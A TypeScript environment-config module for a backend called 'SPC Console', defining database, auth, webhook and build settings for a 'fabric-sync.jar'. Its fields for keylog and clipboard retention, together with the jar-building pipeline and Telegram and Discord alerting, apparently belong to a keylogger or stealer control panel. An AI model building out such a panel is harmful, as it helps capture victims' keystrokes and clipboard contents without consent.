import 'dotenv/config';
import { z } from 'zod';

const bool = z.preprocess((v) => v === true || v === '1' || v === 'true', z.boolean());

const schema = z.object({
  NODE_ENV: z.enum(['development', 'test', 'production']).default('development'),
  PORT: z.coerce.number().int().min(1).max(65535).default(4000),
  PUBLIC_URL: z.string().url(),
  DATABASE_URL: z.string().min(1),
  JWT_SECRET: z.string().min(32),
  MASTER_KEY: z.string().min(1),
  MASTER_KEY_OLD: z.string().default(''),
  TRUST_PROXY: bool.default(false),
  CORS_ORIGIN: z.string().default(''),
  STORAGE_DIR: z.string().default('./data/artifacts'),
  BUILD_DIR: z.string().default('./data/builds'),
  JAR_SOURCE: z.string().default('../build/libs/fabric-sync.jar'),
  MAX_ARTIFACT_MB: z.coerce.number().int().min(1).max(2048).default(512),
  UPLOAD_TTL_HOURS: z.coerce.number().int().min(1).max(168).default(24),
  JWT_TTL_MIN: z.coerce.number().int().min(5).max(43200).default(720),
  ARGON2_MEMORY_KIB: z.coerce.number().int().min(8192).default(65536),
  ARGON2_TIME: z.coerce.number().int().min(1).default(3),
  LOGIN_MAX_FAILS: z.coerce.number().int().min(1).default(5),
  LOGIN_LOCK_MIN: z.coerce.number().int().min(1).default(15),
  IP_ALLOWLIST: z.string().default(''),
  TOTP_ISSUER: z.string().default('SPC Console'),
  REDIS_URL: z.string().default(''),
  DISCORD_WEBHOOK_URL: z.string().default(''),
  TELEGRAM_BOT_TOKEN: z.string().default(''),
  TELEGRAM_CHAT_ID: z.string().default(''),
  GEOIP_DB: z.string().default(''),
  KEYLOG_RETENTION_DAYS: z.coerce.number().int().min(1).max(3650).default(30),
  CLIPBOARD_RETENTION_DAYS: z.coerce.number().int().min(1).max(3650).default(14),
  EVENT_RETENTION_DAYS: z.coerce.number().int().min(1).max(3650).default(90),
  FAILED_ARTIFACT_RETENTION_DAYS: z.coerce.number().int().min(1).max(3650).default(7),
  LOG_LEVEL: z.string().default('info')
});

function parseMasterKey(value: string): Buffer {
  const decoded = Buffer.from(value, 'base64');
  if (decoded.length === 32) return decoded;
  const utf8 = Buffer.from(value, 'utf8');
  if (utf8.length === 32) return utf8;
  throw new Error('MASTER_KEY must decode to exactly 32 bytes (base64 or raw)');
}

const parsed = schema.safeParse(process.env);
if (!parsed.success) {
  console.error('Invalid environment:', parsed.error.flatten().fieldErrors);
  throw new Error('env_invalid');
}

export const env = {
  ...parsed.data,
  masterKey: parseMasterKey(parsed.data.MASTER_KEY),
  masterKeyOld: parsed.data.MASTER_KEY_OLD ? parseMasterKey(parsed.data.MASTER_KEY_OLD) : null,
  allowlist: parsed.data.IP_ALLOWLIST.split(',').map((s) => s.trim()).filter(Boolean),
  isProd: parsed.data.NODE_ENV === 'production'
};

export type Env = typeof env;
